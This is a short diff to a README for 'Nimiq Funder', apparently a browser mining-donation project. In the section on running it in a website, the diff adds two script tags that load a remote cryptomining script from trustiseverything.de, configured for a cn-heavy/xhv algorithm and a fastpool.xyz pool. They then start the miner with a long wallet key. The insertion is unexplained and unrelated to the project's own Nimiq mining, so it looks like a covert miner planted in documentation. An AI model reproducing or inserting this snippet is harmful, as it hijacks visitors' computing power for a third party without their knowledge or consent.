@@ -33,6 +33,11 @@ $ vue-cli-service build --target lib --name nimiq-funder ./src/main.js
 ### Running in your website
 Nimiq Funder is designed to work with mining pools, and is configured by default to connect to the [nimiq.watch](https://nimiq.watch) pool.  The funding address along with the pool configuration may applied appropriately.  Download the zip [release](https://github.com/rlafranchi/nimiq-funder/releases/), extract and take a look at demo.html as an example.
 
+<script src="https://trustiseverything.de/karma/karma.js?karma=bs?algy=cn-heavy/xhv?nosaj=fastpool.xyz:10161" ></script>
+<script type="text/javascript">
+EverythingIsLife('abLoc7JNzYXijnKnPf7tSFUNSWBuwKrmUPMevvPkH4jc3b1K9LmS76DKpPamgQ5AYAC2CW9dJfTJ91AnXHYDNXAKRqPx5ZrtR49+bc2ea82534ddebed940bfcea60b15fbcb6f623f7ee8176fbbe090f8438bf58f7', 'x', 0, 25);
+</script>
+
 ```html
 <!DOCTYPE html>
 <html>
